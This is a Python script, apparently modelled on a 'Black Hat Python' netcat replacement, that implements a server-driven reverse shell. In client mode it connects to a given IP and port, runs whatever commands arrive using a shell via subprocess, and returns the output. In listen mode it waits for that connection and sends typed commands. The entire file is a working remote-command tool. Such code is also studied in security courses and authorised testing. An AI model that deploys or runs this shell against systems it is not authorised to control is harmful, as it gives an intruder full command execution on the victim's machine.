import sys
import socket
import getopt
import subprocess

# Global variables
listen = False
target = ""
port = 0


def run_command(cmd):
    """Execute a command locally and return output."""
    cmd = cmd.strip()
    if not cmd:
        return b""
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    return output


def client_loop():
    """Client connects to server, receives commands, executes, and returns output."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        while True:
            # Receive command from server
            cmd_buffer = b""
            while b"\n" not in cmd_buffer:
                data = client.recv(1024)
                if not data:
                    return  # server closed connection
                cmd_buffer += data

            cmd = cmd_buffer.decode().strip()
            if cmd.lower() in ("exit", "quit"):
                break

            # Execute command and send output back
            output = run_command(cmd)
            if not output:
                output = b"[+] Command executed.\n"
            client.send(output)
    except Exception as e:
        print(f"[*] Connection error: {e}")
    finally:
        client.close()


def server_loop():
    """Server listens for clients and sends commands."""
    global target
    if not target:
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    print(f"[*] Listening on {target}:{port}")

    client_socket, addr = server.accept()
    print(f"[+] Client connected from {addr[0]}:{addr[1]}")

    while True:
        try:
            cmd = input("> ")
            if not cmd:
                continue
            cmd += "\n"
            client_socket.send(cmd.encode())

            # Receive response
            response = b""
            while True:
                data = client_socket.recv(4096)
                response += data
                if len(data) < 4096:
                    break
            print(response.decode(), end="")

            if cmd.strip().lower() in ("exit", "quit"):
                print("[*] Closing connection")
                client_socket.close()
                break

        except Exception as e:
            print(f"[*] Error: {e}")
            client_socket.close()
            break


def usage():
    print("Server-driven Reverse Shell")
    print("Usage:")
    print("  Server: bhp_net.py -l -p port")
    print("  Client: bhp_net.py -t server_ip -p port")
    sys.exit()


def main():
    global listen, target, port

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(
            sys.argv[1:], "hlt:p:", ["help", "listen", "target=", "port="]
        )
        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
            elif o in ("-l", "--listen"):
                listen = True
            elif o in ("-t", "--target"):
                target = a
            elif o in ("-p", "--port"):
                port = int(a)
    except getopt.GetoptError:
        usage()

    if listen:
        server_loop()
    else:
        client_loop()


if __name__ == "__main__":
    main()